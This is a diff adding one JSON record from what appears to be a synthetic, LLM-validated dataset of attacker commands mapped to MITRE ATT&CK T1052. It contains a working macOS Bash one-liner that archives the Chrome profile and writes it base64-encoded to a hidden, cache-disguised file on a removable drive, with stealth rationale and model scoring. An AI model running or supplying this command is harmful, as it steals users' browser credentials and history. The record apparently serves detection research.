@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "tar -czf - \"$HOME/Library/Application Support/Google/Chrome/Default\" | base64 | dd of=\"/Volumes/UNTITLED/.cache/.gupd\" bs=4m conv=sync,noerror && sync",
+  "explanation": "Packages the Chrome profile directory, base64-encodes it, and writes to a cache-looking file on a removable drive via dd to stage browsing data offline.",
+  "rationale_steps": [
+    "Target application data likely to contain credentials and history.",
+    "Encode the data to mimic cache-like text content.",
+    "Write to external media with dd, remaining entirely local.",
+    "Sync to ensure completion before removal."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-24937b47-c4fc4f2b",
+  "source_prompt_hash": "24937b47",
+  "timestamp_utc": "2025-09-30T05:19:16.168507Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed with balanced quoting, valid tar/base64/dd options, and correct pipe/&& separators.",
+        "semantic_score": 4,
+        "semantic_justification": "It archives the Chrome profile, base64-encodes it, and writes to a hidden file on a likely removable volume consistent with T1052, though it assumes the destination directory exists and conv=sync may add trailing NUL padding that could hinder later decoding.",
+        "combined_score": 4.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-01T10:12:16.851553Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags for all tools (tar, base64, dd), correct command separators (pipes and &&), and proper path references.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 (Exfiltration Over Physical Medium) by compressing Chrome browser data, encoding it to avoid binary transfer issues, and writing it to a hidden-looking location on a removable volume with a deceptive filename.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T10:12:20.327858Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quoting, valid flags for all utilities, and correct use of pipes and logical operators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by correctly identifying the Chrome profile, packaging/encoding it, and writing to a plausible stealthy location on a removable drive, fully aligning with T1052.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T10:12:30.875532Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
